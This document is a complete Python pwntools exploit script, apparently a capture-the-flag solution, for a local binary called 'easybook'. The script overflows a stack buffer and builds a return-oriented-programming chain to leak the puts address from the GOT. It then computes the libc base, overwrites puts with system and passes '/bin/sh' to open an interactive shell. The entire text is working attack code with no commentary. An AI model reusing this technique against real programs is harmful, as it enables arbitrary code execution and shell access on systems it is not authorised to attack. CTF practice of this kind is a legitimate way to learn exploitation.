from pwn import *

p = process("./easybook")
elf = ELF("./easybook")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pop_ret = 0x400ce3

p.recvuntil("\n")
temp_addr = 0x603000
payload = "a" * 0x30 + "b" * 0x8
payload += p64(pop_ret) + p64(elf.got["puts"]) + p64(elf.plt["puts"])
payload += p64(pop_ret) + p64(temp_addr) + p64(elf.plt["gets"])
payload += p64(pop_ret) + p64(elf.got["puts"]) + p64(elf.plt["gets"])
payload += p64(elf.plt["puts"])
log.info(hex(elf.got["puts"]))
p.sendline(payload)

p.recvuntil("choice:\n")
p.sendline("4")
puts_addr = u64(p.recvuntil("\x0a")[:-1].ljust(8 , "\x00"))
libc_base = puts_addr - libc.sym["puts"]
# str_bin_sh = libc_base + libc.search("/bin/sh\x00").next()
system = libc_base + libc.sym["system"]

p.sendline("/bin/sh\x00")
p.sendline(p64(system)[:7])
p.interactive()